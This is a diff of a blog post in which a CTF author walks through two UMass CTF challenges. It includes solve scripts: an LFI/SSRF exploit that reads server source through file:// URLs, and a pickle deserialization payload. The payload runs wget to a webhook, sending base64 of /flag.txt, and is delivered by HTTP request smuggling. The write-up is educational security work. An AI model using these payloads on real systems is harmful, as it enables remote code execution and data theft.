@@ -33,7 +33,8 @@
         <div class="blog-panel">
             UMass CTF is always a fun (and also quite stressful) time of the year here at UMass. I've been a challenge
             author for the past two years and would say I have a bit of author experience now. With that said, I only
-            contributed to two challs this year <a href="#future_router">Future Router</a> and <a href="#cash_cache">Cash Cache</a>.
+            contributed to two challs this year <a href="#future_router">Future Router</a> and <a
+                href="#cash_cache">Cash Cache</a>.
         </div>
         <h1 id="future_router">
             Future Router
@@ -109,26 +110,9 @@
         </div>
         <pre>
             <code class="language-python">
-from flask import Flask
-from blueprints.routes import httpserver
-
-app = Flask(__name__)
-# This web server is the property of Sheldon J. Plankton, 
-# please refrain from reading this secret source code.
-# I WILL USE THIS ROUTER TO STEAL THE SECRET KRABBY PATTY FORMULA!
-app.register_blueprint(httpserver, url_prefix='/')
-            </code>
-        </pre>
-        <div class="blog-panel">
-            At this point, I leaned into the Spongebob theme a bit... The router was in fact taken over by Plantkon. But
-            we can't read the rest of the source code because it's imported in another file. So, I expected players to
-            simply request <code>file:///proc/self/cwd/blueprints/routes.py</code> and read the rest of the source.
-        </div>
-        <pre>
-                <code class="language-python">
 from flask import Flask, request, render_template, Blueprint,send_from_directory
 from io import BytesIO
-import pycurl 
+import pycurl
 
 httpserver = Blueprint('httpserver', __name__)
 
@@ -139,7 +123,7 @@ httpserver = Blueprint('httpserver', __name__)
 #
 #    <h2>Websocket API</h2>
 #
-#    <strong>TODO: Document how to talk to 
+#    <strong>TODO: Document how to talk to
 #   Karen's customer service module in ../karen/customerservice.py
 #   Also figure out how to use supervisord better.</strong>
 #"""
@@ -172,9 +156,9 @@ def customerservice():
     return render_template('customerservice.html')
 
 NETWORK = [
-    {'hostname':'patricks-rock','ports':[{'service':'http','num':80}]},
-    {'hostname':'spongebobs-spatula','ports':[{'service':'http','num':80}]},
-    {'hostname':'squidwards-clarinet','ports':[{'service':'http','num':80}]},
+    {'hostname':'patricks_rock','ports':[{'service':'http','num':80}]},
+    {'hostname':'spongebobs_spatula','ports':[{'service':'http','num':80}]},
+    {'hostname':'squidwards_clarinet','ports':[{'service':'http','num':80}]},
 
 ]
 @httpserver.route("/dash",methods=["GET"])
@@ -198,19 +182,14 @@ from websockets.server import serve
 # Due to security concerns, I, Sheldon J. Plankton have ensured this module
 # has no access to any internet service other than those that are
 # trusted. This agent will trick Krabs into sending me the secret
-# krabby patty formula which I will log into Karen's secret krabby patty 
+# krabby patty formula which I will log into Karen's secret krabby patty
 # secret formula file! First, I have to fix a few security bugs!
 class KarenCustomerServiceAgent:
-    SECRET_KEY = bytearray(b"\xe1\x86\xb2\xa0_
-    \x83B\xad\xd7\xaf\x87f\x1e\xb4\xcc\xbf
-    ...i will have the secret krabby patty formula.")
+    SECRET_KEY = bytearray(b"\xe1\x86\xb2\xa0_\x83B\xad\xd7\xaf\x87f\x1e\xb4\xcc\xbf...i will have the secret krabby patty formula.")
     Dialogue = {
-        "Welcome":"Hello! Welcome to the Future 
-        Router service bot!",
-        "Secret formula":"Thank you for your 
-        input, we will process your request in 1-3 business days",
-        "Problem":"Are you having an issue? 
-        Please enter the secret krabby patty formula in the dialogue box to continue"
+        "Welcome":"Hello! Welcome to the Future Router service bot!",
+        "Secret formula":"Thank you for your input, we will process your request in 1-3 business days",
+        "Problem":"Are you having an issue? Please enter the secret krabby patty formula in the dialogue box to continue"
     }
     def handle_input(self,message):
         if ("hello" in message):
@@ -222,8 +201,7 @@ class KarenCustomerServiceAgent:
         elif("problem" in message):
             return self.Dialogue["Problem"]
         else:
-            return "I could not understand your message, this agent is under construction. 
-            Please use the other implemented features for now!"
+            return "I could not understand your message, this agent is under construction. Please use the other implemented features for now!"
     def xor_decrypt(self,ciphertext):
         plaintext = ""
         cipher_arr = bytearray(ciphertext)
@@ -263,29 +241,25 @@ import requests as r
 from websockets.sync.client import connect
 
 
-
 class KarenCustomerServiceAgent:
-    SECRET_KEY = bytearray(b"\xe1\x86\xb2\xa0_\x83B\xad\xd7\xaf\x87f\x1e
-    \xb4\xcc\xbf...i will have the secret krabby patty formula.")
+    SECRET_KEY = bytearray(b"\xe1\x86\xb2\xa0_\x83B\xad\xd7\xaf\x87f\x1e\xb4\xcc\xbf...i will have the secret krabby patty formula.")
     Dialogue = {
         "Welcome":"Hello! Welcome to the Future Router service bot!",
-        "Secret formula":"Thank you for your input, we will process your 
-        request in 1-3 business days",
-        "Problem":"Are you having an issue? Please enter the secret 
-        krabby patty formula in the dialogue box to continue"
+        "Secret formula":"Thank you for your input, we will process your request in 1-3 business days",
+        "Problem":"Are you having an issue? Please enter the secret krabby patty formula in the dialogue box to continue"
     }
     def xor_decrypt(self,ciphertext):
         plaintext = ""
         cipher_arr = bytearray(ciphertext)
         for i in range(0,len(cipher_arr)):
-            plaintext += chr(cipher_arr[i] ^ self.SECRET_KEY[i % 
-            len(self.SECRET_KEY)])
+            plaintext += chr(cipher_arr[i] ^ self.SECRET_KEY[i % len(self.SECRET_KEY)])
         return plaintext
 
 KarenAgent = KarenCustomerServiceAgent()
 
-HOSTNAME = "localhost:33044"
+HOSTNAME = "localhost:3000"
 
+print("Checking LFI... LFI works!")
 r1 = r.post(f"http://{HOSTNAME}/cURL",headers={
     'Content-Type':'application/json'
 },json={
@@ -294,7 +268,7 @@ r1 = r.post(f"http://{HOSTNAME}/cURL",headers={
 
 
 if "SECRET" in r1.text:
-    print("Successfully exploited LFI!")
+    print("Successfully, exploited LFI!")
 else:
     print("LFI failed... Is the httpserver server working?")
     exit()
@@ -323,8 +297,7 @@ if "flag" in r1.text:
     print("Exfiltrated command via tmp sucessfully!")
     print(r1.json()['success'])
 else:
-    print("Command output is not in /tmp . 
-    The command did not execute or we were unable to write to /tmp.")
+    print("Command output is not in /tmp . The command did not execute or we were unable to write to /tmp.")
     exit()
 
 r1 = r.post(f"http://{HOSTNAME}/cURL",headers={
@@ -343,8 +316,8 @@ print(f"Your flag should be {r1.json()['success']}")
         <div class="blog-panel">
             All in all, I hope this challenge was fun and rewarding for players even though there was no source. I
             wanted to make a chall with some vulnerabilities I haven't seen in other CTF's so the source code leak was
-            the way I went. Sometime after this blog post is released, I'll link a repo where I have the intended
-            setup for this chall if people want to try to solve it in its intended configuration.
+            the way I went. If you're interested in trying out the chall in its intended configuration, I've uploaded
+            the code <a href="https://github.com/Jaquiez/my-ctf-challenges/tree/main/UMASS-CTF-2024/future_router">here</a>.
         </div>
 
         <h1 id="cash_cache"> Cash Cache</h1>
@@ -376,8 +349,8 @@ print(f"Your flag should be {r1.json()['success']}")
         <pre>
             <code class="language-python">
 if ("X-Cache-UID" in resp.headers and "X-Cache-Hit" not in resp.headers):
-resp.headers['X-Cache-Hit'] = "MISSED!"
-UID = resp.headers['X-Cache-UID']
+    resp.headers['X-Cache-Hit'] = "MISSED!"
+    UID = resp.headers['X-Cache-UID']
 if (REDIS_CLIENT.exists(UID)):
     cash_elem = pickle.loads(
         base64.b64decode(REDIS_CLIENT.get(UID)))
@@ -465,32 +438,32 @@ app.post('/debug', async (req, res) => {
         <pre>
             <code class="language-python">
 def parseHTTPReq(text):
-try:
-    Requests = []
-    stream_text = text.decode()
-    spent = 0
-    while (stream_text):
-        cur, _, stream_text = stream_text.partition("\r\n")
-        method, route, version = cur.split(' ')
-        Headers = {}
-        while (True):
+    try:
+        Requests = []
+        stream_text = text.decode()
+        spent = 0
+        while (stream_text):
             cur, _, stream_text = stream_text.partition("\r\n")
-            if (cur == ''):
-                break
-            key, _, val = cur.partition(':')
-            Headers[key] = val.replace(' ', '')
-        if ("Cash-Encoding" in Headers and Headers["Cash-Encoding"] == "Money!"):
-            body, stream_text, spent = parseCash(stream_text)
-        else:
-            body = stream_text
-            stream_text = ""
-        Headers['Content-Length'] = len(body)
-        req = HTTPReq(method, route, version, Headers, body)
-        Requests.append(req)
-    return Requests, spent
-except Exception as e:
-    log(e)
-    return None, None
+            method, route, version = cur.split(' ')
+            Headers = {}
+            while (True):
+                cur, _, stream_text = stream_text.partition("\r\n")
+                if (cur == ''):
+                    break
+                key, _, val = cur.partition(':')
+                Headers[key] = val.replace(' ', '')
+            if ("Cash-Encoding" in Headers and Headers["Cash-Encoding"] == "Money!"):
+                body, stream_text, spent = parseCash(stream_text)
+            else:
+                body = stream_text
+                stream_text = ""
+            Headers['Content-Length'] = len(body)
+            req = HTTPReq(method, route, version, Headers, body)
+            Requests.append(req)
+        return Requests, spent
+    except Exception as e:
+        log(e)
+        return None, None
             </code>
         </pre>
         <div class="blog-panel">
@@ -591,8 +564,7 @@ WEBHOOK = ""
 class PickleRCE(object):
     def __reduce__(self):
         import os
-        return (os.system, ("wget "+WEBHOOK+"?c=$(cat${IFS}/flag.txt
-        |base64${IFS}-w0)",))
+        return (os.system, ("wget "+WEBHOOK+"?c=$(cat${IFS}/flag.txt|base64${IFS}-w0)",))
 
 
 data = base64.b64encode(pickle.dumps(PickleRCE()))
@@ -607,17 +579,12 @@ sock = sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 sock.connect((HOSTNAME, PORT))
 
-SMUGGLED_REQ = f"""POST /debug HTTP/1.1\r\nHost: localhost\r\n
-X-Forwarded-For: 127.0.0.1\r\nContent-Type:
- application/x-www-form-urlencoded\r\nContent-Length: 190\r\n
- Connection:close\r\n\r\nuid={UID}&data={data.decode()}"""
+SMUGGLED_REQ = f"""POST /debug HTTP/1.1\r\nHost: localhost\r\nX-Forwarded-For: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 190\r\nConnection:close\r\n\r\nuid={UID}&data={data.decode()}"""
 
 LEN_OF_REQ = len(SMUGGLED_REQ.encode())
 
 print(LEN_OF_REQ)
-HTTP_REQ = f"""GET /test2 HTTP/1.1\r\nHost: {HOSTNAME}:{PORT}
-\r\nCash-Encoding: Money!\r\nContent-Length: {2+2*LEN_OF_REQ}
-\r\n\r\nnan{chr(9)*(LEN_OF_REQ-11)} DOLLARS\r\n{SMUGGLED_REQ}"""
+HTTP_REQ = f"""GET /test2 HTTP/1.1\r\nHost: {HOSTNAME}:{PORT}\r\nCash-Encoding: Money!\r\nContent-Length: {2+2*LEN_OF_REQ}\r\n\r\nnan{chr(9)*(LEN_OF_REQ-11)} DOLLARS\r\n{SMUGGLED_REQ}"""
 
 sock.send(HTTP_REQ.encode())
 
